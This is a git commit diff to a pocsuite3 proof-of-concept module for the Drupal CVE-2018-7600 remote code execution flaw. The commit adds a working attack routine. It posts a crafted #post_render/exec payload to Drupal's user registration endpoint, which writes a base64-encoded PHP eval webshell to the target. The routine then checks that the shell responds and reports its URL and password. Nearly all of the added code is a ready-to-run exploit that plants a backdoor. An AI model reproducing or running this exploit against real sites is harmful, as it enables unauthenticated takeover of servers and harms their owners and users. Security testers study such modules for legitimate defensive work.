2e62c4d57b292d2b5adefd64a664e251c727817c
root <root@localhost.localdomain>
2019-11-12 14:22:00 +0800

    添加drupal_cve_2018_7600_rce

--- pocsuite3/pocs/Drupal/drupal_cve_2018_7600_rce.py
+++ pocsuite3/pocs/Drupal/drupal_cve_2018_7600_rce.py
@@ -4,14 +4,17 @@ https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
 for more about information, plz visit http://pocsuite.org
 """
 
+import os, base64
+from urllib.parse import urljoin
+
 from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger
 from pocsuite3.lib.utils import random_str
 
 
 class DemoPOC(POCBase):
-    vulID = '97207'  # ssvid
+    vulID = '97207 CVE-2018-7600'  # ssvid
     version = '1.0'
-    author = ['seebug']
+    author = ['seebug', 'cz']
     vulDate = '2018-03-08'
     createDate = '2018-04-12'
     updateDate = '2018-04-13'
@@ -19,10 +22,9 @@ class DemoPOC(POCBase):
     name = 'Drupal core Remote Code Execution'
     appPowerLink = ''
     appName = 'Drupal'
-    appVersion = ''
+    appVersion = '7-7.57, 8.x-8.3.8, 8.4.x-5, 8.5.0'
     vulType = 'Romote Code Execution'
-    desc = '''
-    '''
+    desc = '''由于Drupal对Form API（FAPI）的AJAX请求的输入没有进行严格过滤，使得攻击者有机会将恶意荷载注入内部表单结构，从而导致Drupal在没有进行用户认证的情况下执行恶意荷载。'''
     samples = []
     install_requires = ['']
     category = POC_CATEGORY.EXPLOITS.WEBAPP
@@ -58,7 +60,39 @@ class DemoPOC(POCBase):
             output.fail('target is not vulnerable')
         return output
 
-    _attack = _verify
+    def _attack(self):
+        result = {}
+        filename = random_str(6)+'.php'
+        webshell = '''<?php echo 'DEADBEEF';eval($_REQUEST['CzRee']); ?>'''
+        url = self.url.rstrip('/') + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+        cmd = '''echo {} | base64 -d | tee {}'''.format(base64.b64encode(webshell.encode()).decode(), filename)
+        payload = {
+            'form_id': 'user_register_form',
+            '_drupal_ajax': '1',
+            'mail[#post_render][]': 'exec',
+            'mail[#type]': 'markup',
+            'mail[#markup]': cmd
+        }
+
+        resp = requests.post(url, data=payload)
+        r = requests.get(urljoin(self.url, filename))
+        try:
+            if 'DEADBEEF' in r.text:
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = url
+                result['VerifyInfo']['Postdata'] = payload
+                result['ShellInfo'] = {}
+                result['ShellInfo']['URL'] = urljoin(self.url, filename)
+                result['ShellInfo']['Content'] = 'CzRee'
+        except Exception as ex:
+            logger.error(str(ex))
+
+        return self.parse_output(result)
+
+    def _shell(self):
+        pass
+    
+    _check = _verify
 
 
 register_poc(DemoPOC)
